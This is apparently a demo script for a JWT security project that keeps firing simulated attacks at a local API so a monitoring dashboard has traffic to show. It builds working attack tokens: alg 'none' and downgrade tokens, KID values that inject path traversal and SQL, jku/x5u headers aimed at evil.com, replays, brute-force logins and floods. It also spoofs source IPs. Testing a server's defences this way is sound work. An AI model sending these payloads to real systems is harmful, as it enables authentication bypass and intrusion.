/**
 * ╔═══════════════════════════════════════════════════════════════╗
 * ║          JWT SHIELD — Live Attack Simulator                  ║
 * ║  Continuously generates realistic attack traffic against     ║
 * ║  the API so the dashboard shows live threat monitoring.      ║
 * ╚═══════════════════════════════════════════════════════════════╝
 *
 * Usage:  node demos/auto_attack_simulator.js
 * Stop:   Ctrl+C
 */

const API = process.env.API_URL || 'http://localhost:3001';

// ── Randomized fake IPs to simulate distributed attacks ──────────
const FAKE_IPS = [
  '185.220.101.42', '23.129.64.210', '171.25.193.78',
  '62.102.148.68',  '104.244.76.13', '209.141.45.189',
  '45.153.160.2',   '192.42.116.16', '198.98.56.149',
  '91.219.236.174', '103.251.167.20','178.62.197.82',
  '5.188.62.214',   '34.92.166.55',  '139.59.48.222',
  '80.82.77.139',   '46.161.27.112', '185.56.80.65',
  '112.85.42.88',   '203.176.135.70',
];

const USER_AGENTS = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0',
  'python-requests/2.31.0',
  'curl/8.4.0',
  'Go-http-client/2.0',
  'PostmanRuntime/7.36.0',
  'sqlmap/1.7.11#stable',
  'Nikto/2.5.0',
  'Mozilla/5.0 (compatible; Googlebot/2.1)',
  'BurpSuite/2024.1',
  'Hydra/9.5',
];

const ATTACK_LABELS = {
  none:       '🚫 None Algorithm Exploit',
  downgrade:  '⬇️  Algorithm Downgrade',
  kid:        '🔑 KID Injection',
  confusion:  '🔀 Key Confusion (jwk embed)',
  replay:     '🔁 Replay Attack',
  malformed:  '💀 Malformed Token',
  expired:    '⏰ Expired Token',
  flood:      '🌊 Request Flood',
  valid:      '✅ Legitimate Request',
  bruteforce: '🔓 Login Brute Force',
};

// ── Helpers ──────────────────────────────────────────────────────
function randomItem(arr) { return arr[Math.floor(Math.random() * arr.length)]; }
function randomInt(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }
function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
function timestamp() { return new Date().toLocaleTimeString('en-IN', { hour12: false, timeZone: 'Asia/Kolkata' }); }

function fakeHeaders() {
  return {
    'Content-Type': 'application/json',
    'User-Agent': randomItem(USER_AGENTS),
    'X-Forwarded-For': randomItem(FAKE_IPS),
  };
}

// ── Attack Generators ────────────────────────────────────────────

/** alg: "none" — unsigned token bypass */
function craftNoneToken() {
  const header = Buffer.from(JSON.stringify({ alg: 'none', typ: 'JWT' })).toString('base64url');
  const payload = Buffer.from(JSON.stringify({
    sub: `attacker_${randomInt(1, 999)}`,
    iat: Math.floor(Date.now() / 1000),
    exp: Math.floor(Date.now() / 1000) + 3600,
    iss: 'jwt-shield-demo',
    aud: 'jwt-shield-api',
  })).toString('base64url');
  return `${header}.${payload}.`;
}

/** Algorithm downgrade — use HS256 instead of RS256 */
function craftDowngradeToken() {
  const header = Buffer.from(JSON.stringify({ alg: 'HS256', typ: 'JWT' })).toString('base64url');
  const payload = Buffer.from(JSON.stringify({
    sub: `hacker_${randomInt(1, 999)}`,
    iat: Math.floor(Date.now() / 1000),
    exp: Math.floor(Date.now() / 1000) + 3600,
    iss: 'jwt-shield-demo',
    aud: 'jwt-shield-api',
  })).toString('base64url');
  const fakeSig = Buffer.from('fakesignature' + randomInt(1000, 9999)).toString('base64url');
  return `${header}.${payload}.${fakeSig}`;
}

/** KID injection — unknown key id */
function craftKidInjectionToken() {
  const maliciousKids = [
    '../../etc/passwd', '../key.pem', 'admin-key',
    "'; DROP TABLE keys; --", '/dev/null', 'key_99',
    '../../../../proc/self/environ', 'attacker-key-v1',
  ];
  const header = Buffer.from(JSON.stringify({
    alg: 'RS256', typ: 'JWT', kid: randomItem(maliciousKids)
  })).toString('base64url');
  const payload = Buffer.from(JSON.stringify({
    sub: 'admin',
    iat: Math.floor(Date.now() / 1000),
    exp: Math.floor(Date.now() / 1000) + 3600,
    iss: 'jwt-shield-demo',
    aud: 'jwt-shield-api',
    role: 'admin',
  })).toString('base64url');
  const fakeSig = Buffer.from('injected' + randomInt(1000, 9999)).toString('base64url');
  return `${header}.${payload}.${fakeSig}`;
}

/** Key confusion — embed JWK/JKU in header */
function craftKeyConfusionToken() {
  const confusionFields = [
    { jku: 'https://evil.com/.well-known/jwks.json' },
    { jwk: { kty: 'RSA', n: 'fake', e: 'AQAB' } },
    { x5u: 'https://evil.com/cert.pem' },
    { x5c: ['MIIBxTCCAW+gAwIBAgIJAP...'] },
  ];
  const extra = randomItem(confusionFields);
  const header = Buffer.from(JSON.stringify({
    alg: 'RS256', typ: 'JWT', ...extra,
  })).toString('base64url');
  const payload = Buffer.from(JSON.stringify({
    sub: 'admin', iat: Math.floor(Date.now() / 1000),
    exp: Math.floor(Date.now() / 1000) + 3600,
  })).toString('base64url');
  const fakeSig = Buffer.from('confused' + randomInt(1000, 9999)).toString('base64url');
  return `${header}.${payload}.${fakeSig}`;
}

/** Malformed — broken structure */
function craftMalformedToken() {
  const variants = [
    'not.a.jwt.at.all.lol',
    'eyJhbGciOiJS',                                     // incomplete
    Buffer.from('{"alg":"RS256"}').toString('base64url'), // just header
    'abc.def.',                                          // empty sig
    '.....',                                             // dots only
    Buffer.from('notjson').toString('base64url') + '.payload.sig',
  ];
  return randomItem(variants);
}

/** Expired token */
function craftExpiredToken() {
  const header = Buffer.from(JSON.stringify({ alg: 'RS256', typ: 'JWT' })).toString('base64url');
  const payload = Buffer.from(JSON.stringify({
    sub: `user_${randomInt(1, 50)}`,
    iat: Math.floor(Date.now() / 1000) - 90000,
    exp: Math.floor(Date.now() / 1000) - 3600,
    iss: 'jwt-shield-demo',
    aud: 'jwt-shield-api',
  })).toString('base64url');
  const fakeSig = Buffer.from('expiredsig' + randomInt(1000, 9999)).toString('base64url');
  return `${header}.${payload}.${fakeSig}`;
}

// ── Attack Executors ─────────────────────────────────────────────

async function sendMaliciousToken(token, label) {
  try {
    const res = await fetch(`${API}/api/data`, {
      method: 'POST',
      headers: { ...fakeHeaders(), Authorization: `Bearer ${token}` },
    });
    const body = await res.text();
    const status = res.status;
    const icon = status === 403 ? '🛡️ BLOCKED' : status === 401 ? '⛔ REJECTED' : '⚠️  ' + status;
    console.log(`[${timestamp()}] ${label.padEnd(35)} → ${icon}  ${body.slice(0, 80)}`);
  } catch (e) {
    console.log(`[${timestamp()}] ${label.padEnd(35)} → ❌ ERROR: ${e.message}`);
  }
}

async function doValidRequest() {
  try {
    // Use consistent headers for login and request (fingerprint binding matches User-Agent + IP)
    const consistentHeaders = fakeHeaders();
    const loginRes = await fetch(`${API}/auth/login`, {
      method: 'POST',
      headers: consistentHeaders,
      body: JSON.stringify({ username: 'demo', password: 'demo' }),
    });
    const { token } = await loginRes.json();
    if (!token) { console.log(`[${timestamp()}] ✅ Legitimate Request              → ⚠️  Login failed`); return; }

    const res = await fetch(`${API}/api/data`, {
      method: 'POST',
      headers: { ...consistentHeaders, Authorization: `Bearer ${token}` },
    });
    const body = await res.text();
    console.log(`[${timestamp()}] ✅ Legitimate Request              → ✅ ${res.status} ${body.slice(0, 60)}`);
  } catch (e) {
    console.log(`[${timestamp()}] ✅ Legitimate Request              → ❌ ERROR: ${e.message}`);
  }
}

async function doReplayAttack() {
  try {
    // Use consistent headers for login and both requests
    const consistentHeaders = fakeHeaders();
    const loginRes = await fetch(`${API}/auth/login`, {
      method: 'POST',
      headers: consistentHeaders,
      body: JSON.stringify({ username: 'demo', password: 'demo' }),
    });
    const { token } = await loginRes.json();
    if (!token) return;

    // First use — should succeed
    await fetch(`${API}/api/data`, {
      method: 'POST',
      headers: { ...consistentHeaders, Authorization: `Bearer ${token}` },
    });

    // Replay — should be blocked
    await sleep(100);
    const res = await fetch(`${API}/api/data`, {
      method: 'POST',
      headers: { ...consistentHeaders, Authorization: `Bearer ${token}` },
    });
    const body = await res.text();
    console.log(`[${timestamp()}] 🔁 Replay Attack                   → 🛡️ BLOCKED  ${body.slice(0, 60)}`);
  } catch (e) {
    console.log(`[${timestamp()}] 🔁 Replay Attack                   → ❌ ERROR: ${e.message}`);
  }
}

async function doBruteForce() {
  const passwords = ['admin', 'password', '123456', 'root', 'letmein', 'qwerty'];
  const pw = randomItem(passwords);
  try {
    const res = await fetch(`${API}/auth/login`, {
      method: 'POST',
      headers: fakeHeaders(),
      body: JSON.stringify({ username: 'admin', password: pw }),
    });
    const body = await res.text();
    console.log(`[${timestamp()}] 🔓 Login Brute Force (pw: ${pw.padEnd(10)}) → ⛔ ${res.status} ${body.slice(0, 50)}`);
  } catch (e) {
    console.log(`[${timestamp()}] 🔓 Login Brute Force               → ❌ ERROR: ${e.message}`);
  }
}

async function doFloodBurst() {
  console.log(`[${timestamp()}] 🌊 Request Flood (burst of 8)      → firing...`);
  const token = craftNoneToken();
  const promises = Array.from({ length: 8 }, () =>
    fetch(`${API}/api/data`, {
      method: 'POST',
      headers: { ...fakeHeaders(), Authorization: `Bearer ${token}` },
    }).then(r => r.status).catch(() => 'ERR')
  );
  const results = await Promise.all(promises);
  console.log(`[${timestamp()}] 🌊 Request Flood results            → [${results.join(', ')}]`);
}

// ── Attack Scheduler ─────────────────────────────────────────────

const ATTACK_POOL = [
  { weight: 15, name: 'none',       fn: () => sendMaliciousToken(craftNoneToken(), ATTACK_LABELS.none) },
  { weight: 12, name: 'downgrade',  fn: () => sendMaliciousToken(craftDowngradeToken(), ATTACK_LABELS.downgrade) },
  { weight: 12, name: 'kid',        fn: () => sendMaliciousToken(craftKidInjectionToken(), ATTACK_LABELS.kid) },
  { weight: 10, name: 'confusion',  fn: () => sendMaliciousToken(craftKeyConfusionToken(), ATTACK_LABELS.confusion) },
  { weight: 10, name: 'malformed',  fn: () => sendMaliciousToken(craftMalformedToken(), ATTACK_LABELS.malformed) },
  { weight: 8,  name: 'expired',    fn: () => sendMaliciousToken(craftExpiredToken(), ATTACK_LABELS.expired) },
  { weight: 8,  name: 'replay',     fn: () => doReplayAttack() },
  { weight: 8,  name: 'bruteforce', fn: () => doBruteForce() },
  { weight: 5,  name: 'flood',      fn: () => doFloodBurst() },
  { weight: 12, name: 'valid',      fn: () => doValidRequest() },
];

function pickAttack() {
  const total = ATTACK_POOL.reduce((s, a) => s + a.weight, 0);
  let r = Math.random() * total;
  for (const attack of ATTACK_POOL) {
    r -= attack.weight;
    if (r <= 0) return attack;
  }
  return ATTACK_POOL[0];
}

// ── Main Loop ────────────────────────────────────────────────────

let totalAttacks = 0;
let totalBlocked = 0;

async function main() {
  console.log('');
  console.log('╔═══════════════════════════════════════════════════════════════╗');
  console.log('║        🛡️  JWT SHIELD — Live Attack Simulator  🛡️            ║');
  console.log('╠═══════════════════════════════════════════════════════════════╣');
  console.log('║  Target:  ' + API.padEnd(50) + '║');
  console.log('║  Mode:    Continuous random attacks                          ║');
  console.log('║  Stop:    Press Ctrl+C                                       ║');
  console.log('╚═══════════════════════════════════════════════════════════════╝');
  console.log('');
  console.log('  Open the dashboard to see live attack tracking:');
  console.log('  👉  http://localhost:5173');
  console.log('');
  console.log('─'.repeat(80));
  console.log('');

  // Verify API is reachable
  try {
    const health = await fetch(`${API}/health`);
    if (!health.ok) throw new Error(`Status ${health.status}`);
    console.log(`[${timestamp()}] ✅ API is reachable — starting attack simulation...\n`);
  } catch (e) {
    console.error(`[${timestamp()}] ❌ Cannot reach API at ${API} — is it running?`);
    console.error(`   Start it with: pnpm dev:api`);
    process.exit(1);
  }

  // Run attacks continuously
  while (true) {
    const attack = pickAttack();
    await attack.fn();
    totalAttacks++;

    // Random delay between attacks (0.5s to 3s) — feels like real traffic
    const delay = randomInt(500, 3000);
    await sleep(delay);

    // Every 20 attacks, print a summary
    if (totalAttacks % 20 === 0) {
      console.log('');
      console.log(`  ── Summary: ${totalAttacks} attacks sent ──`);
      console.log('');
    }
  }
}

// Graceful shutdown
process.on('SIGINT', () => {
  console.log('\n');
  console.log('╔═══════════════════════════════════════════════════════════════╗');
  console.log(`║  Simulation stopped — ${totalAttacks} total attacks sent`.padEnd(62) + '║');
  console.log('╚═══════════════════════════════════════════════════════════════╝');
  process.exit(0);
});

main().catch(console.error);
